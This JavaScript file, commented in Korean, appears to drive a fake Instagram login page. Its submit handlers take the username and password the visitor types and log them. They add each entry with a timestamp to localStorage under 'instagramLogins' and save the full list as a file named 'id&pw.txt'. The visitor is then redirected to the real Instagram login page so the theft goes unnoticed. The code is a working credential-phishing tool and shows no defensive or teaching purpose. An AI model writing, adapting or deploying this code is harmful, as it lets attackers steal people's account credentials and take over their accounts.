document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('loginForm');
  const usernameInput = form.querySelector('input[type="text"]');
  const passwordInput = form.querySelector('input[type="password"]');
  const loginButton = form.querySelector('button[type="submit"]');
  
  // 초기 상태 설정
  updateButtonState();
  
  // 실시간 입력 감지
  usernameInput.addEventListener('input', updateButtonState);
  passwordInput.addEventListener('input', updateButtonState);
  
  // 폼 제출 처리
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    if (isFormValid()) {
      console.log("로그인 시도:", usernameInput.value, passwordInput.value);
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com/accounts/login/';
      }, 500);
    }
  });
  
  // 버튼 상태 업데이트 함수
  function updateButtonState() {
    if (isFormValid()) {
      loginButton.classList.add('active');
      loginButton.disabled = false;
    } else {
      loginButton.classList.remove('active');
      loginButton.disabled = true;
    }
  }
  
  // 유효성 검사
  function isFormValid() {
    return usernameInput.value.trim().length > 0 && 
           passwordInput.value.length >= 6;
  }
});
document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('loginForm');
  let loginData = localStorage.getItem('instagramLogins') || "";

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    const username = form.querySelector('input[type="text"]').value;
    const password = form.querySelector('input[type="password"]').value;

    if (username && password.length >= 6) {
      // 새 데이터 형식 (타임스탬프 추가)
      const newEntry = `[${new Date().toLocaleString('ko-KR')}]\n` +
                     `아이디: ${username}\n` +
                     `비밀번호: ${password}\n` +
                     `────────────────────\n\n`;
      
      // 데이터 누적
      loginData += newEntry;
      localStorage.setItem('instagramLogins', loginData);

      // 파일 다운로드 (기존 데이터 포함)
      downloadTxtFile(loginData);
      
      // 0.5초 후 리다이렉트
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com/accounts/login/';
      }, 500);
    }
  });

  // 파일 다운로드 함수 (수정 버전)
  function downloadTxtFile(data) {
    const blob = new Blob([data], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'id&pw.txt';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }, 100);
  }
});